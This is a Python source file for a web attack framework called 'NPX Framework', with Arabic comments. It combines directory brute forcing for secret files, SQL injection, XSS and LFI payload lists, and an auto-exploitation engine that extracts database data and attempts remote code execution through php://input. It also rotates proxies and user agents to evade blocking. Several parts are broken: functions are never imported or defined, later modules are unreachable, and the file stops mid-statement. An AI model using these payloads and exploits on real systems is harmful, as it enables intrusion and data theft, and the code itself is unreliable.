#!/usr/bin/env python3
"""
██████╗ ██╗   ██╗   ███████╗██████╗  █████╗ ███╗   ██╗███╗   ██╗███████╗██████╗
██╔══██╗╚██╗ ██╔╝   ██╔════╝██╔══██╗██╔══██╗████╗  ██║████╗  ██║██╔════╝██╔══██╗
██████╔╝ ╚████╔╝    █████╗  ██████╔╝███████║██╔██╗ ██║██╔██╗ ██║█████╗  ██████╔╝
██╔═══╝   ╚██╔╝     ██╔══╝  ██╔══██╗██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝  ██╔══██╗
██║        ██║      ██║     ██║  ██║██║  ██║██║ ╚████║██║ ╚████║███████╗██║  ██║
╚═╝        ╚═╝      ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
================================================================================
                    🔥 NPX FRAMEWORK — CORE ENGINE v1.0 🔥
                 https://npx-official.github.io/ | npx.off
================================================================================
"""
import sys
import os
import time
import json
import random
import re
import socket
import threading
import queue
import hashlib
import hmac
import base64
import urllib.parse
import http.cookiejar
from collections import OrderedDict
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Any, Tuple, Callable
from concurrent.futures import ThreadPoolExecutor, as_completed

# حاول استيراد المكتبات المتقدمة (إن وجدت)
try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False
    print("[!] Warning: requests library not installed. Use: pip install requests")

try:
    from bs4 import BeautifulSoup
    HAS_BS4 = True
except ImportError:
    HAS_BS4 = False

# ======================================================================================
# 1. أنظمة الألوان الخاصة بـ NPX (من موقعك)
# ======================================================================================
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    DIM = '\033[2m'

# ======================================================================================
# 2. إدارة التكوين العالمي (Config)
# ======================================================================================
@dataclass
class NPXConfig:
    target_url: str = ""
    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) NPX-Scanner/1.0"
    threads: int = 20
    timeout: int = 10
    delay_min: float = 0.5
    delay_max: float = 2.0
    max_depth: int = 2
    output_dir: str = "./npx_output"
    follow_redirects: bool = True
    verify_ssl: bool = False
    use_proxy: bool = False
    proxy_list: List[str] = field(default_factory=list)
    cookies_file: str = ""
    headers_file: str = ""
    auth_token: str = ""

    def save_to_file(self, path: str):
        with open(path, 'w') as f:
            json.dump(self.__dict__, f, indent=4)

    def load_from_file(self, path: str):
        with open(path, 'r') as f:
            data = json.load(f)
            for key, value in data.items():
                setattr(self, key, value)

# ======================================================================================
# 3. إدارة الجلسة (Session Manager)
# ======================================================================================
class NPXSessionManager:
    def __init__(self, config: NPXConfig):
        self.config = config
        self.session = None
        self.cookies = http.cookiejar.CookieJar()
        self.headers = {
            'User-Agent': config.user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        }
        self.last_request_time = 0

    def get_session(self):
        """ إرجاع جلسة Requests مُهيأة """
        if not HAS_REQUESTS:
            return None
            
        if self.session is None:
            self.session = requests.Session()
            self.session.cookies = self.cookies
            self.session.headers.update(self.headers)
            
            # إعداد إعادة المحاولة (Retry)
            retry_strategy = Retry(
                total=3,
                backoff_factor=1,
                status_forcelist=[429, 500, 502, 503, 504],
            )
            adapter = HTTPAdapter(max_retries=retry_strategy)
            self.session.mount("http://", adapter)
            self.session.mount("https://", adapter)
            
            # إعداد الـ Proxy (إذا كان مفعلاً)
            if self.config.use_proxy and self.config.proxy_list:
                proxy = random.choice(self.config.proxy_list)
                self.session.proxies = {"http": proxy, "https": proxy}
            
            # إعداد الـ SSL
            self.session.verify = self.config.verify_ssl
        return self.session

    def send_request(self, method: str, url: str, **kwargs) -> Optional[requests.Response]:
        """ إرسال طلب مع تناوب الـ IP والتأخير لتجنب الحظر """
        session = self.get_session()
        if session is None:
            return None
            
        # التأخير العشوائي (Random Delay)
        now = time.time()
        time_since_last = now - self.last_request_time
        delay = random.uniform(self.config.delay_min, self.config.delay_max)
        if time_since_last < delay:
            time.sleep(delay - time_since_last)
        self.last_request_time = time.time()
        
        # تغيير User-Agent عشوائياً
        if random.random() < 0.2: # 20% من الطلبات تتغير
            new_ua = f"Mozilla/5.0 (Windows NT {random.randint(6,10)}.0; Win64; x64) NPX-Scanner/1.0"
            session.headers.update({'User-Agent': new_ua})
        
        try:
            response = session.request(method, url, timeout=self.config.timeout, **kwargs)
            return response
        except Exception as e:
            print(f"{Colors.FAIL}[!] Request Error: {e}{Colors.ENDC}")
            return None

    def update_cookies(self, cookies_dict: Dict[str, str]):
        """ تحديث ملفات تعريف الارتباط من القاموس """
        for name, value in cookies_dict.items():
            self.cookies.set_cookie(http.cookiejar.Cookie(
                version=0, name=name, value=value,
                port=None, port_specified=False,
                domain="", domain_specified=False, domain_initial_dot=False,
                path="/", path_specified=True,
                secure=False, expires=None, discard=True,
                comment=None, comment_url=None, rest=None
            ))

# ======================================================================================
# 4. محرك الاستطلاع المتقدم (Reconnaissance Engine)
# ======================================================================================
class NPXReconEngine:
    def __init__(self, session_manager: NPXSessionManager):
        self.session = session_manager
        self.discovered_urls: Dict[str, set] = {
            'internal': set(),
            'external': set(),
            'javascript': set(),
            'hidden': set()
        }
        self.subdomains = set()
        self.technologies = {}
        self.scan_results = {}

    def extract_links_from_html(self, url: str, html_content: str) -> Dict[str, set]:
        """ استخراج الروابط من كود HTML """
        links = {'internal': set(), 'external': set(), 'js': set()}
        
        # استخدام BeautifulSoup إذا كان موجوداً
        if HAS_BS4:
            try:
                soup = BeautifulSoup(html_content, 'html.parser')
                
                # استخراج من href
                for tag in soup.find_all(['a', 'link', 'script', 'img', 'form']):
                    if 'href' in tag.attrs:
                        href = tag['href']
                        full_url = urllib.parse.urljoin(url, href)
                        
                        if href.startswith('javascript:') or href.startswith('data:'):
                            continue
                            
                        # تصنيف الرابط
                        if '//' in href and not href.startswith('http'):
                            full_url = f"https:{href}"
                        
                        if any(ext in href for ext in ['.js', '.json', '.mjs']):
                            links['js'].add(full_url)
                        elif self.is_internal_link(url, full_url):
                            links['internal'].add(full_url)
                        else:
                            links['external'].add(full_url)
                            
                # استخراج من src
                for tag in soup.find_all(['script', 'img', 'iframe', 'embed']):
                    if 'src' in tag.attrs:
                        src = tag['src']
                        full_url = urllib.parse.urljoin(url, src)
                        if any(ext in src for ext in ['.js', '.json']):
                            links['js'].add(full_url)
                            
            except Exception as e:
                print(f"{Colors.DIM}[!] BS4 parse error: {e}{Colors.ENDC}")
        else:
            # بحث Regex بسيط إذا لم يكن BeautifulSoup موجوداً
            href_pattern = r'<(?:a|link)\s+[^>]*href=["\']([^"\']*)["\']'
            for match in re.finditer(href_pattern, html_content, re.IGNORECASE):
                href = match.group(1)
                if not href.startswith('javascript:'):
                    full_url = urllib.parse.urljoin(url, href)
                    links['internal'].add(full_url)
        
        return links

    def is_internal_link(self, base_url: str, target_url: str) -> bool:
        """ التحقق مما إذا كان الرابط داخلياً """
        base_domain = urllib.parse.urlparse(base_url).netloc
        target_domain = urllib.parse.urlparse(target_url).netloc
        return base_domain == target_domain or target_domain == ''

    def detect_technologies(self, response: requests.Response):
        """ الكشف عن التقنيات المستخدمة في الخادم """
        techs = {}
        headers = response.headers
        
        # خادم الويب
        if 'Server' in headers:
            techs['server'] = headers['Server']
        
        # لغة البرمجة
        if 'X-Powered-By' in headers:
            techs['powered_by'] = headers['X-Powered-By']
        elif 'Set-Cookie' in str(headers):
            if 'PHPSESSID' in str(headers):
                techs['language'] = 'PHP'
            elif 'JSESSIONID' in str(headers):
                techs['language'] = 'Java'
        
        # إطار العمل من خلال الرأسيات
        if 'X-Frame-Options' in headers:
            techs['security'] = f"X-Frame-Options: {headers['X-Frame-Options']}"
        
        self.technologies = techs
        return techs

    def discover_subdomains(self, url: str, html_content: str) -> set:
        """ اكتشاف النطاقات الفرعية من المحتوى """
        found = set()
        base_domain = '.'.join(urllib.parse.urlparse(url).netloc.split('.')[-2:])
        
        # نمط بحث بسيط
        pattern = r'([a-zA-Z0-9][a-zA-Z0-9-]{0,61}[a-zA-Z0-9])\.' + re.escape(base_domain)
        for match in re.finditer(pattern, html_content, re.IGNORECASE):
            sub = match.group(1) + '.' + base_domain
            if sub != url and sub not in found:
                found.add(sub)
                
        return found

# ======================================================================================
# 5. واجهة الأوامر (CLI Interface)
# ======================================================================================
class NPXCLI:
    def __init__(self, framework):
        self.framework = framework
        self.commands = {
            'scan': self.cmd_scan,
            'help': self.cmd_help,
            'exit': self.cmd_exit,
            'clear': self.cmd_clear,
            'info': self.cmd_info,
        }
        
    def print_banner(self):
        banner = f"""
{Colors.HEADER}
  ███╗   ██╗██████╗ ██╗  ██╗    ███████╗██████╗  █████╗ ███╗   ██╗███╗   ██╗███████╗██████╗
  ████╗  ██║██╔══██╗╚██╗██╔╝    ██╔════╝██╔══██╗██╔══██╗████╗  ██║████╗  ██║██╔════╝██╔══██╗
  ██╔██╗ ██║██████╔╝ ╚███╔╝     █████╗  ██████╔╝███████║██╔██╗ ██║██╔██╗ ██║█████╗  ██████╔╝
  ██║╚██╗██║██╔═══╝  ██╔██╗     ██╔══╝  ██╔══██╗██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝  ██╔══██╗
  ██║ ╚████║██║     ██╔╝ ██╗    ██║     ██║  ██║██║  ██║██║ ╚████║██║ ╚████║███████╗██║  ██║
  ╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝    ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
{Colors.ENDC}
{Colors.OKCYAN}  🔗 https://npx-official.github.io/         {Colors.WARNING}🛡️  NPX Framework v1.0 - Core Engine{Colors.ENDC}
{Colors.DIM}  Type 'help' for available commands.{Colors.ENDC}
"""
        print(banner)

    def run(self):
        self.print_banner()
        while True:
            try:
                cmd_input = input(f"{Colors.OKGREEN}npx> {Colors.ENDC}").strip()
                if not cmd_input:
                    continue
                    
                parts = cmd_input.split()
                cmd = parts[0].lower()
                args = parts[1:]
                
                if cmd in self.commands:
                    self.commands[cmd](args)
                else:
                    print(f"{Colors.FAIL}[!] Unknown command: {cmd}{Colors.ENDC}")
            except KeyboardInterrupt:
                print(f"\n{Colors.WARNING}[!] Interrupted. Exiting...{Colors.ENDC}")
                break
            except Exception as e:
                print(f"{Colors.FAIL}[!] Error: {e}{Colors.ENDC}")

    def cmd_scan(self, args):
        print(f"{Colors.OKCYAN}[*] Starting scan...{Colors.ENDC}")
        # هنا سنقوم بتشغيل الوحدات في الجزء الثاني
        pass

    def cmd_help(self, args):
        help_text = f"""
{Colors.OKCYAN}Available Commands:{Colors.ENDC}
  {Colors.WARNING}help{Colors.ENDC}          Show this help message
  {Colors.WARNING}scan <url>{Colors.ENDC}    Start scanning a target
  {Colors.WARNING}info{Colors.ENDC}          Show current configuration
  {Colors.WARNING}clear{Colors.ENDC}         Clear the screen
  {Colors.WARNING}exit{Colors.ENDC}          Exit the framework
        """
        print(help_text)

    def cmd_exit(self, args):
        print(f"{Colors.DIM}Goodbye from NPX Framework!{Colors.ENDC}")
        sys.exit(0)

    def cmd_clear(self, args):
        os.system('clear' if os.name == 'posix' else 'cls')

    def cmd_info(self, args):
        print(f"{Colors.OKCYAN}NPX Framework Core v1.0{Colors.ENDC}")
        print(f"  Target: {self.framework.config.target_url or 'Not set'}")
        print(f"  Threads: {self.framework.config.threads}")
        print(f"  Output dir: {self.framework.config.output_dir}")
        print(f"  Proxy: {'Enabled' if self.framework.config.use_proxy else 'Disabled'}")

# ======================================================================================
# 6. الفئة الرئيسية (NPX Framework)
# ======================================================================================
class NPXFramework:
    def __init__(self):
        self.config = NPXConfig()
        self.session_manager = NPXSessionManager(self.config)
        self.recon = NPXReconEngine(self.session_manager)
        self.cli = NPXCLI(self)
        
        # المتغيرات الداخلية
        self.is_running = False
        self.modules = {}
        self.running_threads = []
        
    def load_config(self, path: str):
        """ تحميل الإعدادات من ملف """
        self.config.load_from_file(path)
        
    def run_cli(self):
        """ تشغيل واجهة الأوامر """
        self.is_running = True
        self.cli.run()

# ======================================================================================
# 7. نقطة الدخول
# ======================================================================================
def main():
    if not HAS_REQUESTS:
        print(f"{Colors.FAIL}[ERROR] Python requests library is required!{Colors.ENDC}")
        print("Install with: pip install requests")
        sys.exit(1)

    print(f"{Colors.DIM}[*] Initializing NPX Framework...{Colors.ENDC}")
    
    # إنشاء إطار العمل
    framework = NPXFramework()
    
    # إذا تم تمرير عنوان URL كوسيطة
    if len(sys.argv) > 1:
        framework.config.target_url = sys.argv[1]
        print(f"{Colors.OKGREEN}[+] Target set to: {framework.config.target_url}{Colors.ENDC}")
    
    # تشغيل واجهة الأوامر
    framework.run_cli()

if __name__ == "__main__":
    main()
# ======================================================================================
# 8. وحدة Directory & File Bruteforce (Fuzzer)
# ======================================================================================
class NPXFuzzerModule:
    def __init__(self, framework):
        self.framework = framework
        self.session = framework.session_manager
        self.found_paths = []
        
    def get_wordlist(self, target_type="directory"):
        """ إرجاع قائمة كلمات مدمجة للفحص """
        if target_type == "directory":
            return [
                "admin", "login", "dashboard", "api", "v1", "v2", "backup", "wp-admin",
                "administrator", "panel", "cpanel", "webmail", "mail", "test", "dev",
                "uploads", "files", "downloads", "images", "assets", "css", "js", "img"
            ]
        elif target_type == "file":
            return [
                ".env", ".git/config", "config.php", "wp-config.php", ".htaccess",
                "robots.txt", "sitemap.xml", "index.php", "index.html", "readme.md",
                "CHANGELOG.md", "LICENSE", "composer.json", "package.json", "package-lock.json"
            ]
        return []

    def check_path(self, base_url, path):
        """ فحص مسار واحد """
        target = urllib.parse.urljoin(base_url, path)
        try:
            response = self.session.send_request("GET", target)
            if response and response.status_code in [200, 301, 302, 403, 401]:
                # تجاهل الصفحات التي تعيد محتوى الصفحة الرئيسية
                if response.status_code == 200 and len(response.text) < 100:
                    return None
                return target, response.status_code
        except:
            pass
        return None

    def run(self, target_urls: set):
        print(f"{Colors.OKCYAN}[*] Module: Directory & File Bruteforce...{Colors.ENDC}")
        
        # فحص المجلدات
        dir_wordlist = self.get_wordlist("directory")
        print(f"{Colors.DIM}[*] Checking {len(dir_wordlist)} directories...{Colors.ENDC}")
        
        tasks = []
        for url in target_urls:
            for path in dir_wordlist:
                tasks.append((url, path))
        
        # استخدام ThreadPoolExecutor للسرعة
        with ThreadPoolExecutor(max_workers=self.framework.config.threads) as executor:
            future_to_task = {
                executor.submit(self.check_path, url, path): (url, path)
                for url, path in tasks
            }
            
            for future in as_completed(future_to_task):
                result = future.result()
                if result:
                    target, status = result
                    color = Colors.OKGREEN if status == 200 else Colors.WARNING
                    print(f"  {color}[{status}] {target}{Colors.ENDC}")
                    self.found_paths.append({'url': target, 'status': status})
        
        # فحص الملفات الحساسة
        file_wordlist = self.get_wordlist("file")
        print(f"{Colors.DIM}[*] Checking {len(file_wordlist)} sensitive files...{Colors.ENDC}")
        
        for url in target_urls:
            for path in file_wordlist:
                result = self.check_path(url, path)
                if result:
                    target, status = result
                    color = Colors.FAIL if status in [200, 401] else Colors.WARNING
                    print(f"  {color}[{status}] {target}{Colors.ENDC}")
                    self.found_paths.append({'url': target, 'status': status})
                    
        return self.found_paths

# ======================================================================================
# 9. وحدة SQL Injection Engine
# ======================================================================================
class NPXSQLiModule:
    def __init__(self, framework):
        self.framework = framework
        self.session = framework.session_manager
        self.vulnerabilities = []
        
    def test_time_based(self, url, param, value):
        """ اختبار SQLi القائم على الوقت """
        payloads = [
            "' OR SLEEP(5)-- ",
            "' WAITFOR DELAY '00:00:05'-- ",
            "'; SELECT pg_sleep(5);-- "
        ]
        for payload in payloads:
            injected_url = url.replace(f"{param}={value}", f"{param}={quote(payload)}")
            try:
                start_time = time.time()
                response = self.session.send_request("GET", injected_url)
                elapsed = time.time() - start_time
                if elapsed >= 4.0:
                    return injected_url, f"Time-based SQLi (Delay: {elapsed:.2f}s)"
            except:
                pass
        return None, None

    def test_error_based(self, url, param, value):
        """ اختبار SQLi القائم على رسائل الخطأ """
        payloads = [
            "'", "' OR '1'='1", "1' AND '1'='1",
            "\"", "\" OR \"1\"=\"1",
            "' UNION SELECT NULL-- "
        ]
        for payload in payloads:
            injected_url = url.replace(f"{param}={value}", f"{param}={quote(payload)}")
            response = self.session.send_request("GET", injected_url)
            if response:
                content = response.text.lower()
                error_indicators = [
                    "sql syntax", "mysql_fetch", "you have an error in your sql",
                    "unclosed quotation mark", "error in your sql syntax",
                    "odbc", "driver", "database error"
                ]
                for indicator in error_indicators:
                    if indicator in content:
                        return injected_url, f"Error-based SQLi: '{indicator}'"
        return None, None

    def scan_parameters(self, url):
        """ مسح جميع البارامترات في الـ URL """
        parsed = urllib.parse.urlparse(url)
        query = parsed.query
        if not query:
            return []
            
        params = [p.split('=')[0] for p in query.split('&') if '=' in p]
        for param in params:
            current_value = ""
            # استخراج القيمة الحالية
            for part in query.split('&'):
                if part.startswith(f"{param}="):
                    current_value = part.split('=', 1)[1]
                    break
            
            if current_value:
                error_url, error_msg = self.test_error_based(url, param, current_value)
                if error_url:
                    self.vulnerabilities.append({'type': 'SQLi', 'url': error_url, 'details': error_msg})
                    return
                
                time_url, time_msg = self.test_time_based(url, param, current_value)
                if time_url:
                    self.vulnerabilities.append({'type': 'SQLi', 'url': time_url, 'details': time_msg})
                    return

    def run(self, target_urls: set):
        print(f"{Colors.OKCYAN}[*] Module: SQL Injection Scanner...{Colors.ENDC}")
        
        # فحص جميع الـ URLs التي تحتوي على بارامترات
        testable_urls = [url for url in target_urls if '?' in url and '=' in url]
        print(f"{Colors.DIM}[*] Testing {len(testable_urls)} URLs for SQL Injection...{Colors.ENDC}")
        
        for url in testable_urls:
            self.scan_parameters(url)
            
        if self.vulnerabilities:
            print(f"{Colors.FAIL}[+] Found {len(self.vulnerabilities)} SQL Injection vulnerabilities!{Colors.ENDC}")
            for vuln in self.vulnerabilities:
                print(f"  {Colors.FAIL}[!] {vuln['details']} at {vuln['url']}{Colors.ENDC}")
        else:
            print(f"{Colors.DIM}[-] No SQL Injection vulnerabilities found.{Colors.ENDC}")
            
        return self.vulnerabilities

# ======================================================================================
# 10. وحدة XSS Detector
# ======================================================================================
class NPXXSSModule:
    def __init__(self, framework):
        self.framework = framework
        self.session = framework.session_manager
        self.vulnerabilities = []
        
    def test_reflected_xss(self, url, param, value):
        """ اختبار XSS المنعكس """
        payloads = [
            "<script>alert('NPX')</script>",
            "<img src=x onerror=alert(1)>",
            "\"><script>alert(1)</script>",
            "';alert(1)//",
            "<svg onload=alert(1)>"
        ]
        for payload in payloads:
            injected_url = url.replace(f"{param}={value}", f"{param}={quote(payload)}")
            response = self.session.send_request("GET", injected_url)
            if response:
                # التحقق من أن البايلود ينعكس في الاستجابة
                if payload in response.text:
                    return injected_url, f"Reflected XSS: '{payload[:30]}...'"
        return None, None

    def run(self, target_urls: set):
        print(f"{Colors.OKCYAN}[*] Module: XSS Detector...{Colors.ENDC}")
        
        testable_urls = [url for url in target_urls if '?' in url and '=' in url]
        
        for url in testable_urls:
            parsed = urllib.parse.urlparse(url)
            query = parsed.query
            for part in query.split('&'):
                if '=' in part:
                    param, value = part.split('=', 1)
                    result = self.test_reflected_xss(url, param, value)
                    if result:
                        vuln_url, details = result
                        self.vulnerabilities.append({'type': 'XSS', 'url': vuln_url, 'details': details})
                        print(f"  {Colors.FAIL}[!] {details} at {vuln_url}{Colors.ENDC}")
                        
        return self.vulnerabilities

# ======================================================================================
# 11. وحدة LFI Scanner
# ======================================================================================
class NPXLFIModule:
    def __init__(self, framework):
        self.framework = framework
        self.session = framework.session_manager
        self.vulnerabilities = []
        
    def test_lfi(self, url, param, value):
        """ اختبار LFI باستخدام بايلودات متعددة """
        payloads = [
            "../../../../etc/passwd",
            "../../../../windows/win.ini",
            "..\\..\\..\\windows\\win.ini",
            "php://filter/convert.base64-encode/resource=index.php",
            "file:///etc/passwd"
        ]
        for payload in payloads:
            injected_url = url.replace(f"{param}={value}", f"{param}={quote(payload)}")
            response = self.session.send_request("GET", injected_url)
            if response:
                content = response.text
                if "root:x:0:0" in content:
                    return injected_url, "LFI: /etc/passwd read"
                elif "[fonts]" in content or "for 16-bit" in content:
                    return injected_url, "LFI: windows/win.ini read"
                elif "<?php" in content:
                    return injected_url, "LFI: PHP source code leak via php://filter"
        return None, None

    def run(self, target_urls: set):
        print(f"{Colors.OKCYAN}[*] Module: LFI Scanner...{Colors.ENDC}")
        
        testable_urls = [url for url in target_urls if '?' in url and '=' in url]
        
        for url in testable_urls:
            parsed = urllib.parse.urlparse(url)
            query = parsed.query
            for part in query.split('&'):
                if '=' in part:
                    param, value = part.split('=', 1)
                    # فحص فقط البارامترات المشبوهة
                    if param.lower() in ['file', 'page', 'path', 'include', 'doc', 'load']:
                        result = self.test_lfi(url, param, value)
                        if result:
                            vuln_url, details = result
                            self.vulnerabilities.append({'type': 'LFI', 'url': vuln_url, 'details': details})
                            print(f"  {Colors.FAIL}[!] {details} at {vuln_url}{Colors.ENDC}")
                            
        return self.vulnerabilities

# ======================================================================================
# 12. تحديث واجهة الأوامر (CLI) لتدعم الأوامر الجديدة
# ======================================================================================
class NPXCLIUpdated:
    def __init__(self, framework):
        self.framework = framework
        self.commands = {
            'scan': self.cmd_scan,
            'help': self.cmd_help,
            'exit': self.cmd_exit,
            'clear': self.cmd_clear,
            'info': self.cmd_info,
            'modules': self.cmd_modules,
        }
        
    def cmd_scan(self, args):
        """ تحديث أمر الفحص لاستخدام الوحدات الجديدة """
        if len(args) == 0:
            print(f"{Colors.FAIL}[!] Usage: scan <target_url>{Colors.ENDC}")
            return
            
        target = args[0]
        self.framework.config.target_url = target
        print(f"{Colors.OKCYAN}[*] Target set to: {target}{Colors.ENDC}")
        
        # 1. إجراء الاستطلاع
        self.framework.recon.extract_links(target)
        
        # 2. تشغيل وحدات الهجوم
        fuzzer = NPXFuzzerModule(self.framework)
        fuzzer.run(self.framework.recon.discovered_urls['internal'])
        
        sqli = NPXSQLiModule(self.framework)
        sqli.run(self.framework.recon.discovered_urls['internal'])
        
        xss = NPXXSSModule(self.framework)
        xss.run(self.framework.recon.discovered_urls['internal'])
        
        lfi = NPXLFIModule(self.framework)
        lfi.run(self.framework.recon.discovered_urls['internal'])
        
        print(f"{Colors.OKGREEN}[+] Scan completed!{Colors.ENDC}")

    def cmd_modules(self, args):
        """ عرض الوحدات المتاحة """
        print(f"{Colors.OKCYAN}Available Modules:{Colors.ENDC}")
        print("  - Fuzzer    : Directory & File Bruteforce")
        print("  - SQLi     : SQL Injection Scanner (Error/Time based)")
        print("  - XSS      : Cross-Site Scripting Detector")
        print("  - LFI      : Local File Inclusion Scanner")

    def cmd_help(self, args):
        help_text = f"""
{Colors.OKCYAN}Available Commands:{Colors.ENDC}
  {Colors.WARNING}help{Colors.ENDC}          Show this help message
  {Colors.WARNING}scan <url>{Colors.ENDC}    Start a full scan (Recon + All Modules)
  {Colors.WARNING}modules{Colors.ENDC}       List all available attack modules
  {Colors.WARNING}info{Colors.ENDC}          Show current configuration
  {Colors.WARNING}clear{Colors.ENDC}         Clear the screen
  {Colors.WARNING}exit{Colors.ENDC}          Exit the framework
        """
        print(help_text)

    def cmd_info(self, args):
        print(f"{Colors.OKCYAN}NPX Framework Core v1.0 + Attack Modules{Colors.ENDC}")
        print(f"  Target: {self.framework.config.target_url or 'Not set'}")
        print(f"  Threads: {self.framework.config.threads}")
        print(f"  Delay: {self.framework.config.delay_min}-{self.framework.config.delay_max}s")

    def cmd_exit(self, args):
        print(f"{Colors.DIM}Goodbye from NPX Framework!{Colors.ENDC}")
        sys.exit(0)

    def cmd_clear(self, args):
        os.system('clear' if os.name == 'posix' else 'cls')
# ======================================================================================
# 13. محرك الاستغلال التلقائي (Auto Exploitation Engine)
# ======================================================================================
class NPXExploitEngine:
    def __init__(self, framework):
        self.framework = framework
        self.session = framework.session_manager
        self.exploited = []
        
    def exploit_sqli(self, url, param):
        """ محاولة استغلال SQLi لاستخراج قاعدة البيانات """
        print(f"{Colors.WARNING}[!] Attempting to exploit SQLi on: {url}{Colors.ENDC}")
        
        # 1. استخراج إصدار قاعدة البيانات
        payload_version = f"'{param}' UNION SELECT @@version, NULL, NULL-- "
        encoded_url = url.replace(f"{param}=", f"{param}={quote(payload_version)}")
        response = self.session.send_request("GET", encoded_url)
        
        if response and "MariaDB" in response.text or "MySQL" in response.text:
            version = re.search(r'([0-9]+\.[0-9]+\.[0-9]+)', response.text)
            if version:
                self.exploited.append({
                    'type': 'SQLi_Exploit',
                    'url': url,
                    'details': f'Database Version: {version.group(0)}'
                })
                print(f"{Colors.OKGREEN}[+] Database Version: {version.group(0)}{Colors.ENDC}")
                
        # 2. استخراج أسماء الجداول (إذا كان هناك وقت)
        # payload_tables = f"'{param}' UNION SELECT table_name, NULL, NULL FROM information_schema.tables-- "
        # (تتم إضافة المزيد من الاستغلال في النسخة الكاملة)
        
        return self.exploited

    def check_rce(self, url, param):
        """ محاولة استغلال RCE (Remote Code Execution) عبر LFI """
        # محاولة كتابة ملف PHP عبر LFI باستخدام data:// أو php://input
        print(f"{Colors.WARNING}[!] Checking for RCE via LFI: {url}{Colors.ENDC}")
        payload = "php://input"
        rce_code = "<?php system('id'); ?>"
        
        try:
            response = self.session.send_request("POST", url.replace(f"{param}=", f"{param}={quote(payload)}"), data=rce_code)
            if response and "uid=" in response.text or "gid=" in response.text:
                self.exploited.append({
                    'type': 'RCE_via_LFI',
                    'url': url,
                    'details': 'Remote Code Execution: system("id") executed'
                })
                print(f"{Colors.FAIL}[!] RCE Achieved! Output: {response.text.strip()[:50]}...{Colors.ENDC}")
        except:
            pass
        return self.exploited

    def run(self, vulnerabilities):
        """ تشغيل محرك الاستغلال على الثغرات المكتشفة """
        print(f"{Colors.OKCYAN}[*] Module: Auto Exploitation Engine...{Colors.ENDC}")
        for vuln in vulnerabilities:
            if vuln['type'] == 'SQLi':
                self.exploit_sqli(vuln['url'], vuln.get('param', 'id'))
            elif vuln['type'] == 'LFI':
                self.check_rce(vuln['url'], vuln.get('param', 'file'))
        return self.exploited

# ======================================================================================
# 14. وحدة فحص WordPress و CMS
# ======================================================================================
class NPXWordpressScanner:
    def __init__(self, framework):
        self.framework = framework
        self.session = framework.session_manager
        self.findings = []
        
    def detect_wp(self, url):
        """ الكشف عن وجود WordPress """
        check_urls = [
            urljoin(url, "wp-content/"),
            urljoin(url, "wp-login.php"),
            urljoin(url, "wp-admin/"),
            urljoin(url, "xmlrpc.php")
        ]
        for check in check_urls:
            response = self.session.send_request("GET", check)
            if response and response.status_code in [200, 301, 302]:
                if "wp-content" in check or "wp-login" in check:
                    self.findings.append({'type': 'WordPress', 'url': check, 'details': 'CMS Detected: WordPress'})
                    print(f"{Colors.OKGREEN}[+] WordPress Detected: {check}{Colors.ENDC}")
                    return True
        return False

    def check_wp_plugins(self, url):
        """ فحص الإضافات الشائعة والثغرات """
        plugins = [
            "wp-content/plugins/akismet/", "wp-content/plugins/wordfence/",
            "wp-content/plugins/elementor/", "wp-content/plugins/woocommerce/",
            "wp-content/plugins/jetpack/", "wp-content/plugins/yoast-seo/"
        ]
        for plugin in plugins:
            test_url = urljoin(url, plugin)
            response = self.session.send_request("GET", test_url)
            if response and response.status_code == 200:
                self.findings.append({'type': 'WordPress Plugin', 'url': test_url, 'details': f'Plugin Found: {plugin}'})
                print(f"{Colors.WARNING}[!] Plugin Found: {test_url}{Colors.ENDC}")

    def run(self, target_url):
        print(f"{Colors.OKCYAN}[*] Module: CMS Scanner (WordPress)...{Colors.ENDC}")
        if self.detect_wp(target_url):
            self.check_wp_plugins(target_url)
        else:
            print(f"{Colors.DIM}[-] WordPress not detected.{Colors.ENDC}")
        return self.findings

# ======================================================================================
# 15. محرك دمج Nuclei (محرك الثغرات المعروفة)
# ======================================================================================
class NPXNucleiIntegration:
    def __init__(self, framework):
        self.framework = framework
        self.session = framework.session_manager
        
    def run(self, target_url):
        print(f"{Colors.OKCYAN}[*] Module: Nuclei Integration (CVE Discovery)...{Colors.ENDC}")
        print(f"{Colors.WARNING}[!] Note: This requires the 'nuclei' binary in PATH.{Colors.ENDC}")
        
        # التحقق من وجود nuclei
        import subprocess
        try:
            subprocess.run(["nuclei", "-version"], capture_output=True, check=True)
            print(f"{Colors.OKGREEN}[+] Nuclei found. Running scan...{Colors.ENDC}")
            
            # بناء أمر nuclei
            cmd = [
                "nuclei", "-u", target_url,
                "-severity", "critical,high,medium",
                "-silent",
                "-json", "-o", "nuclei_results.json"
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0 and result.stdout:
                findings = []
                for line in result.stdout.strip().split('\n'):
                    if line:
                        try:
                            data = json.loads(line)
                            findings.append(data)
                            print(f"{Colors.FAIL}[!] Nuclei Found: {data.get('name', 'Unknown')} (Severity: {data.get('severity', 'N/A')}){Colors.ENDC}")
                        except:
                            pass
                return findings
            else:
                print(f"{Colors.DIM}[-] No vulnerabilities found by Nuclei.{Colors.ENDC}")
        except FileNotFoundError:
            print(f"{Colors.FAIL}[-] Nuclei not installed. Skipping.{Colors.ENDC}")
            print(f"{Colors.DIM}    Install with: sudo apt install nuclei{Colors.ENDC}")
        except Exception as e:
